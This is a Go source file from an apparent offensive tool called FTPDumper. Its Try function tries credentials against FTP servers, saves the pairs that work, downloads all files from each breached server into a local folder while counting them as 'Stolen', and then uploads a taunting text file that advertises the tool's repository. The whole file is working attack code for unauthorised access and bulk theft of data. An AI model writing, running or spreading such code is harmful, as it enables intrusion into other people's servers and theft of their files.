package Dumper

import (
	"FTPDumper/Core"
	"FTPDumper/Utility"
	"FTPDumper/ftp"
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
)

func Try(address, port, user, password string) error {
	Core.Counter.Increment("Total")
	client := ftp.NewFTPClient(user, password)
	err := client.Connect(fmt.Sprintf("%s:%s", address, port))
	if err != nil {
		return Core.TimeoutErr
	}

	defer client.Disconnect()

	err = client.Login()
	if err != nil {
		return Core.BadCredErr
	}

	Core.Counter.Increment("Success")
	if Core.Verbose {
		fmt.Printf("\033[32m[SUCCESS] %s:%s@%s:%s\u001B[97m\n", address, port, user, password)
	}

	if Core.SaveCredentials {
		_, _ = Core.CredFile.Write([]byte(fmt.Sprintf("%s:%s@%s:%s\n", address, port, user, password)))
	}

	files, err := client.GetFiles()
	if err != nil {
		if Core.Verbose {
			fmt.Printf("\033[31m[FAIL] %s:%s@%s:%s\u001B[97m\n", address, port, user, password)
		}
		return err
	}

	sprintf := fmt.Sprintf("%s/%s", Core.OutputFolder, address)

	for _, file := range files {
		if len(Core.FileFormats) > 0 && !Utility.SuffixAny(file.Name, Core.FileFormats) {
			continue
		}

		Core.Counter.Increment("Stolen")

		hash := sha256.Sum256([]byte(file.Name))
		hexed := hex.EncodeToString(hash[:])
		tempPath := fmt.Sprintf("%s/%s.ftpdumper", os.TempDir(), hexed)

		err = client.DownloadFile(tempPath, file.Name)
		if err != nil {
			if Core.Verbose {
				fmt.Printf("\033[31m[FAIL] %s:%s@%s:%s\u001B[97m\n", address, port, user, password)
			}
			continue
		}

		if stat, err := os.Stat(tempPath); err != nil || stat.Size() < 1 {
			_ = os.Remove(tempPath)
			continue
		}

		if !Utility.FolderExists(sprintf) {
			err = Utility.CreateFolder(sprintf)
			if err != nil {
				continue
			}
		}

		err := os.Rename(tempPath, fmt.Sprintf("%s/%s/%s", Core.OutputFolder, address, file.Name))
		if err != nil {
			return err
		}
	}

	_ = client.UploadFile("FTPDUMPER.txt", bytes.NewReader([]byte("Fix your server credentials\n"+
		"You Can Download FTPDumper From https://github.com/MatrixTM/FTPDumper\n")))

	return nil
}
